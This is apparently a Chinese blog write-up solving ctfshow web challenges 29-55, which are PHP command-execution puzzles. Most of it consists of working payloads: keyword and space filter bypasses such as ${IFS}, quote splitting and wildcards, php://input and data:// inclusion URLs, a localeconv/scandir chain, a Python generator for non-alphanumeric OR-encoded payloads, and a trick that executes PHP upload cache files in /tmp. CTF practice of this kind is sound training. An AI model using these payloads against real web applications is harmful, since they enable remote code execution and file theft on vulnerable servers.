---
title: "ctfshow Web入门[命令执行] web29-55 Writeup"
date: 2022-08-08T16:55:37+08:00
draft: false
tags: ['ctf']
categories: ['web']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

命令执行及绕过技巧

<!--more-->

## web29

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208061200800.png)

过滤了 flag

下面介绍一下 Linux 下几种绕过关键字过滤的方式

```
cat fl''ag.php
cat fl""ag.php
cat fl\ag.php
cat fla*
cat fla?.???
```

不仅仅是文件名, 执行的命令也可以这样绕过, 内容为空的单双引号在 shell 中会直接被忽略, 反斜杠表示命令输入没有结束, 会在下一行继续输入 (这里直接跟在反斜杠后面也算是继续输入), 通配符 `*` 表示匹配所有以 `fla` 开头的文件, 当然也就匹配了 `flag.php`, 而 `?` 表示匹配一个字符, `fla?.???` 匹配以 `fla` 开头的四个字符的文件名 + `.` + 三个字符的后缀名

另外拼接字符也能够绕过, 例如

```
a=fl;b=ag;cat $a$b.php # cat flag.php
```

这里由于是 eval 比较灵活, 使用 PHP 里的一些技巧例如文件包含+伪协议的操作也是可以绕过的

## web30

```
if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
}
```

又过滤了 system php

不过还是 eval, 很灵活, 可以尝试跳出 preg_match 的限制

`http://7f626fea-3dee-431b-90a1-7c9555cd30a7.challenge.ctf.show/?c=eval($_GET[1]);&1=system('cat flag.php');`

或者用 PHP 的反引号执行命令

```
http://7f626fea-3dee-431b-90a1-7c9555cd30a7.challenge.ctf.show/?c=echo `cat fl*`;
```

## web31

```
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
    eval($c);
}
```

过滤了点, 空格还有单引号

过滤空格的几种绕过方式如下

```
%09 (PHP 环境)
{cat,flag.php}
cat${IFS}flag.php
cat$IFS$9flag.php
cat<flag.php
cat<>flag.php
$a=$'\x20flag.php'&&cat$a (\x20 代表空格)
```

过滤 cat 的绕过方式

```
more
less
head
tail
nl
od
vi
vim
sort
uniq
file -f
strings
```

本地测试都可以, 在线测试的时候发现只有 `%09` 可以绕过, 不知道什么情况

```
http://e71bd105-44bb-4322-a7b6-3290f09d59cb.challenge.ctf.show/?c=echo`tac%09fla*`;
```

官方 hint 的方法是这样的

**show_source**(**next**(**array_reverse**(**scandir**(**pos**(**localeconv**())))));

分析一下

`localeconv()` 返回包含本地化数字和货币格式信息的关联数组 (没看懂), 但是要注意的是数组的第一个值为 `.`

```
array(18) {
  ["decimal_point"]=>
  string(1) "."
  ["thousands_sep"]=>
  string(0) ""
  ["int_curr_symbol"]=>
  string(0) ""
  ["currency_symbol"]=>
  string(0) ""
  ["mon_decimal_point"]=>
  string(0) ""
  ["mon_thousands_sep"]=>
  string(0) ""
  ["positive_sign"]=>
  string(0) ""
  ["negative_sign"]=>
  string(0) ""
  ["int_frac_digits"]=>
  int(127)
  ["frac_digits"]=>
  int(127)
  ["p_cs_precedes"]=>
  int(127)
  ["p_sep_by_space"]=>
  int(127)
  ["n_cs_precedes"]=>
  int(127)
  ["n_sep_by_space"]=>
  int(127)
  ["p_sign_posn"]=>
  int(127)
  ["n_sign_posn"]=>
  int(127)
  ["grouping"]=>
  array(0) {
  }
  ["mon_grouping"]=>
  array(0) {
  }
}
```

`pos()` 即 `current()`, 返回数组中的当前值, 默认情况下这里返回的是数组中的第一个值, 也就是 `.`

`scandir()` 用于列出指定路径中的文件和目录, 这里列出当前目录下的内容

```

array(4) {
  [0]=>
  string(1) "."
  [1]=>
  string(2) ".."
  [2]=>
  string(8) "flag.php"
  [3]=>
  string(9) "index.php"
}
```

`array_reverse()` 将数组翻转, 就变成了下面这样

```
array(4) {
  [0]=>
  string(9) "index.php"
  [1]=>
  string(8) "flag.php"
  [2]=>
  string(2) ".."
  [3]=>
  string(1) "."
}
```

`next()` 将数组中的内部指针向前移动一位, 也就是返回下标为1 (第二位) 的值 (flag.php)

最后通过 `show_source()` 高亮显示源码内容

只能说 tql

## web32

```
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
    eval($c);
}
```

又过滤了 `echo` `;` `(` 和反引号

可以使用文件包含的方式绕过

PHP 中 include 和 require 函数无需括号和空格也能使用

```
include"a.php"
require"b.php"
```

然后这里的 `;` 可以使用标签闭合的形式绕过 (PHP 中如果语句只有一行那么结尾可以不用加分号)

以下是几个测试成功的 payload

```
/index.php?c=include"$_GET[1]"?>&1=php://input
/index.php?c=include$_GET[1]?>&1=php://input

/index.php?c=?><?=include"$_GET[1]"?>&1=php://input
/index.php?c=?><?=include$_GET[1]?>&1=php://input
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208061605943.png)

当然 php://filter 也是可以的

## web33

```
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
    eval($c);
}
```

比上题增加了对双引号的过滤

payload

`/index.php?c=include$_GET[1]?>&1=php://input`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208061608432.png)

## web34

在上题的基础上又过滤了 `:`

乍一看以为伪协议用不了, 其实根本没有影响

上题的 payload 依然可用 (参数 c 里面根本就没有 `:`)

`/index.php?c=include$_GET[1]?>&1=php://input`

## web35

增加了 `<` `=` 的过滤

payload 同上

## web36

增加了 `/` `0-9` 的过滤

上面的 payload 稍微改一下

```
/index.php?c=include$_GET[a]?>&a=php://input
/index.php?c=include$_GET{a}?>&a=php://input
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208061628623.png)

## web37

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208061633306.png)

跟文件包含差不多

php://input 绕过

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208061635556.png)

或者使用 data://

`http://a2325636-9ccd-455f-a45d-6c2b9db50274.challenge.ctf.show/?c=data://text/plain,<?php system('cat fla*');?>`

## web38

```
if(!preg_match("/flag|php|file/i", $c)){
    include($c);
    echo $flag;
}
```

data:// 协议

`http://92612de8-a0e7-4daf-8428-bb1e165d0cdb.challenge.ctf.show/?c=data://text/plain,<?=system('cat fla*')?>`

或者是 nginx 日志包含

## web39

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208061645045.png)

只能包含以 `.php` 结尾的文件

php://filter 不能用, 因为用不了通配符, php://input 也不能用, 因为会有 `.php` 干扰

但是 data:// 还是可以用的

data:// 后执行的 PHP 代码必须要有短标签, 否则就是单纯的字符串

payload

`/?c=data://text/plain,<?=system('cat fla*')?>`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208061649435.png)

## web40

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208061731921.png)

那个括号看着不太对劲, 复制下来才发现是全角的括号... 哈哈

`;` `()` 没有被过滤

根据 web31 的方法, payload 如下

```
show_source(next(array_reverse(scandir(pos(localeconv())))));
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208061741689.png)

参考文章

[https://www.freebuf.com/articles/system/242482.html](https://www.freebuf.com/articles/system/242482.html)

[https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE](https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE)

这里是 nginx 服务器, 我们尝试使用 `get_defined_vars()` 进行 RCE

利用 `current()` 取出 `$_GET` 数组

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208061804336.png)

使用 `end()` 取出最后一项

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208061805539.png)

这里 `end()` 取出的是数组对应的值, 也就是 `phpinfo();`

执行命令

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208061807724.png)

hint 用的是 session 的方式

`/?c=session_start();system(session_id());`

其中 `session_id()` 没有指定参数的话返回的是 Cookie 中 PHPSESSID 的值

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208061813462.png)

但是这里的 Cookie 内容只能是数字, 字母还有逗号和减号

本来想用 hex 编码的, 然后发现不能用 `hex2bin()` 函数, 因为数字被过滤了...

## web41

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208061821213.png)

过滤的有点多, 想到了无字母数字的 webshell

参考文章

[https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)

[https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

看完之后才发现都被过滤了...

官方 wp

[https://wp.ctf.show/d/137-ctfshow-web-web41](https://wp.ctf.show/d/137-ctfshow-web-web41)

利用的是 `|` 运算符

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208081410624.png)

需要注意的是, 对字符串的或运算其实是对每一位字符对应的 ASCII 的或运算

例如 `"abc" | "def"` 的执行流程其实是分别将 `a` 和 `d` 的 ASCII 码进行或运算, 得到一个新的字符, 然后是 `b` 和 `e`, 以此类推, 一一对应

据此我们可以从 0-255 的 ASCII 码中找到一些不匹配上面正则表达式的特殊字符, 并且使他们或运算的结果是可打印字符 (32-127) (包含大小写字母, 数字和符号)

wp 中已经给出了脚本, 我这里自己写一个 python 脚本

```
import re

preg = '[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-'

def convertToURL(s):
    if s < 16:
        return '%0' + str(hex(s).replace('0x', ''))
    else:
        return '%' + str(hex(s).replace('0x', ''))

def generateDicts():
    dicts = {}
    for i in range(256):
        for j in range(256):
            if not re.match(preg, chr(i), re.I) and not re.match(preg, chr(j), re.I):
                k = i | j
                if k in range(32, 127):
                    if not k in dicts.keys():
                        dicts[chr(k)] = [convertToURL(i), convertToURL(j)]
    return dicts

def generatePayload(dicts, payload):
    s1 = ''
    s2 = ''
    for s in payload:
        s1 += dicts[s][0]
        s2 += dicts[s][1]
    return f'("{s1}"|"{s2}")'

dicts = generateDicts()
a = generatePayload(dicts, 'system')
b = generatePayload(dicts, 'cat flag.php')
print(a + b)
```

其中 0-15 的 ASCII 码对应的十六进制是单个字符, 需要在前面补零, 然后再改写成 URL 编码的形式

而代码执行的原理在 p神的文章里有写, 这里的版本恰好是 PHP7

> PHP7 前是不允许用 `($a)();` 这样的方法来执行动态函数的，但 PHP7 中增加了对此的支持。所以，我们可以通过 `('phpinfo')();` 来执行函数，第一个括号中可以是任意 PHP 表达式。

生成的 payload 如下

```
("%60%60%60%60%60%60"|"%13%19%13%14%25%0d")("%60%60%60%20%60%60%60%60%2e%60%60%60"|"%23%21%14%20%06%2c%21%27%2e%10%28%10")
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208081418344.png)

## web42

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208081420543.png)

将命令输出重定向到 /dev/null (无法回显)

一些命令分隔符

```
cmd1 | cmd2 只执行 cmd2
cmd1 || cmd2 只有当 cmd1 执行失败后, 才执行 cmd2
cmd1 & cmd2 先执行 cmd1, 不管是否成功, 都会执行 cmd2
cmd1 && cmd2 先执行 cmd1, 执行成功后才执行 cmd2, 否则不执行
cmd1;cmd2 按顺序依次执行,  先执行 cmd1 再执行 cmd2
```

payload

```
http://559633f0-4f44-467c-8fbc-4f2f9870e424.challenge.ctf.show/?c=cat flag.php;echo 1
http://559633f0-4f44-467c-8fbc-4f2f9870e424.challenge.ctf.show/?c=cat flag.php||echo 1
http://559633f0-4f44-467c-8fbc-4f2f9870e424.challenge.ctf.show/?c=cat flag.php&echo 1
http://559633f0-4f44-467c-8fbc-4f2f9870e424.challenge.ctf.show/?c=cat flag.php&&echo 1
```

或者是用 `%0a` 换行符

`http://559633f0-4f44-467c-8fbc-4f2f9870e424.challenge.ctf.show/?c=cat flag.php%0a`

## web43

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208081432061.png)

cat 和 `;` 被过滤了

使用 tac 绕过

## web44

又过滤了 flag

用通配符 `*` 绕过

## web45

又过滤了空格

绕过方式在 web31 中已给出

```
http://af01b830-cdd7-45cc-9a2b-92d8b773afdc.challenge.ctf.show/?c=tac%09fla*||
http://af01b830-cdd7-45cc-9a2b-92d8b773afdc.challenge.ctf.show/?c=tac${IFS}fla*||
......
```

hint 如下

```
echo$IFS`tac$IFS*`%0A
```

测试了一下发现 echo 后面可以直接用 `$IFS` (不加大括号), 第二个 `$IFS` 后面不能跟字母, 否则会报错, 只能跟 `*`

命令会把当前目录下的所有文件的内容都显示出来

## web46

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208081448472.png)

通配符 `*` 用不了可以换成 `?` (只匹配一个字符)

```
http://9f955132-28c2-44b7-8267-b88ab892538c.challenge.ctf.show/?c=tac%09fla?.???||
```

hint 是 `nl<fla''g.php||`

测了一下发现如果是 `*` `?` 这种通配符的话, 无法使用输入重定向 (因为可能会有多个文件)

像 `fla''.php` (其实就是 `flag.php`) 这种文件名唯一的才能使用 `<` 或者 `<>`

## web47

又过滤了 more less head sort tail

tac nl od 依然可以绕过

## web48

又过滤了 sed cut awk strings od curl 和反引号

tac 和 nl 绕过

查了一下发现 sed cut awk curl 也能读文件

以下仅列举一点内容 (因为我也不太会用...)

sed

```
sed '1ahello' flag.txt # 向第1行后面追加 hello, 但由于没有加 -n 选项, 默认输出文件所有内容
sed -n '/ctfshow/p' flag.txt # 打印匹配到 ctfshow 关键字的那一行
```

cut

```
cut -b 1-99 flag.txt # 提取每一行的第1-99个字节
cut -d$'\n' -f1-99 flag.txt # 按换行符分割, 查看第1-99个字段
```

awk

```
awk -F$'\n' '{print $1}' flag.txt # 按换行符分割字段, 依次打印
```

curl

```
curl file:///home/exp10it/flag.txt # 需要知道绝对路径
```

## web49

又过滤了 `%`

但这里是 url 编码, 所以其实没有效果...

之前的 payload 依然可以绕过

## web50

过滤了 `[TAB]` (就是 `%09`) 和 `&`

payload

`http://8c5d99d3-52cf-47d3-903c-3a6bd680e458.challenge.ctf.show/?c=tac<fla''g.php%0a`

## web51

tac 被过滤了

用 nl 绕过

## web52

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208081533292.png)

过滤了 `<` `>`, 但是把 `$` 的过滤取消了

使用 `${IFS}` 绕过

```
http://3a66b6d9-61ce-41d4-a221-55d6fe242df2.challenge.ctf.show/?c=nl$IFS/fla''g.php%0a
http://3a66b6d9-61ce-41d4-a221-55d6fe242df2.challenge.ctf.show/?c=nl${IFS}fla''g.php%0a
```

另外还有 `nl$IFS$9fla''g.php`, 但是数字被过滤了

然后发现是假的 flag... 真的在根目录下

```
http://3a66b6d9-61ce-41d4-a221-55d6fe242df2.challenge.ctf.show/?c=nl$IFS/fla''g%0a
http://3a66b6d9-61ce-41d4-a221-55d6fe242df2.challenge.ctf.show/?c=nl${IFS}/fla''g%0a
```

## web53

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208081543164.png)

nl 绕过

看了 hint 发现 `''` 绕过也适用于 Linux 命令

```
c''at${IFS}fla''g.p''hp
```

## web54

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208081547703.png)

简单来说就是把 `''` 的过滤给 ban 了

无法使用 `ca''t` 来绕过关键字过滤

用 vi 和 `?` 绕过

```
http://e0414892-98e9-4268-b037-7cb78f8fef71.challenge.ctf.show/?c=vi${IFS}fla?.php%0a
```

网上 wp 的其他绕过方式

```
uniq${IFS}fla?.php
grep${IFS}'ctfshow'${IFS}fla?.php
mv${IFS}fla?.php${IFS}a.txt # 浏览器访问 a.txt
```

hint 的方法比较有意思

```
/bin/?at${IFS}f???????
```

利用 `?` 通配符匹配到 cat 命令的文件路径 `/bin/cat`, 然后查看 flag.php

测试了一下发现 `???????`, `???????p`, `f?ag.php` `fl?ag.php` `fla?.php` 等等都能读取

但是 `?lag.php` 读取不了, 不知道是什么原因

(可能要多试几个 payload?)

## web55

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208081600955.png)

直接使用 `/???/??? ????.???` 会匹配到很多莫名其妙的东西...

参考文章 [https://www.cnblogs.com/Dark1nt/archive/2021/06/05/14852301.html](https://www.cnblogs.com/Dark1nt/archive/2021/06/05/14852301.html)

三个思路

1. base64 base32 绕过
2. bzip2 绕过
3.  `.` 执行 PHP 文件上传缓存文件绕过

前两个的原理是它们的文件名都带有数字, 相对来说可以精确匹配 (但不同系统环境不一样, 只能碰运气, 比如我本地 wsl Ubuntu 默认匹配到的是 `/bin/X11/x86_64`)

第三个的原理可以参考 p神之前的文章 [https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

base64 绕过

```
http://770265fe-2a54-4d73-98b5-cd44b3dce236.challenge.ctf.show/?c=/???/????64 ????.???
```

bzip2 (注意路径是 /usr/bin/bzip2)

```
http://770265fe-2a54-4d73-98b5-cd44b3dce236.challenge.ctf.show/?c=/???/???/????2 ????.???
```

`.` 执行缓存文件绕过

php 上传文件时的缓存文件存储路径一般是 /tmp, 文件名为 `php[六位随机大小写字母]`, 总长度为9

Linux 使用 glob 通配符 `[@-[]` 来匹配大写字母 (ASCII 码区间)

```
/?c=. /???/????????[@-[]
```

这里匹配的是最后一个字符是大写字母的文件 (PHP 缓存的文件名最后一个字母**可能**是大写字母, 实际上, 6位随机字符中任意一个位置都有可能是大写字母)

其实测试一下发现, 将 `[@-[]` 放到后六位的任何一位都可以成功执行, 匹配到的概率都差不多

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208081638432.png)

这里因为 bzip2 压缩文件默认会把源文件删除, 所以只剩下 flag.php.bz2 了